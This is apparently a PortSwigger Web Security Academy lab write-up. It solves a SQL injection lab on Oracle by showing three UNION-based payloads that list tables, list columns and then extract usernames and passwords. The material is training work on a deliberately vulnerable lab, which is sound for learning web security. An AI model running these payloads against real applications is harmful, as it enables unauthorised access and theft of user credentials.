# Lab-6: [SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables. 

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users. 

**Aim :-** To solve the lab, log in as the administrator user. 


## Solution
- In Oracle, **all_tables** is a data dictionary view that shows **information about all tables you have access to**

- To see all the tables use the following payload
    ``` ' UNION SELECT table_name,null from all_tables -- ```
    - ``` table_name ``` is the title of the column in all_tables
    - ``` null ``` is used to match the column numbers
    - The query will return all the tables names from the database

- Get the users table name from the response

- Get the column names by using the following payload
    ``` ' UNION SELECT column_name,null FROM all_tab_columns WHERE table_name = <users-table-name> -- ```
    - ``` all_tab_columns ``` describes all the columns names of all the tables in the database
    - ``` WHERE table_name = <users-table-name> ``` Tell which tables column name to return
    - The query will return all the columns names from the users table

- Get the usernames and passwords by using the following payload
    ``` ' UNION SELECT <username-column>,<password-column> FROM <users-table-name> -- ``` 
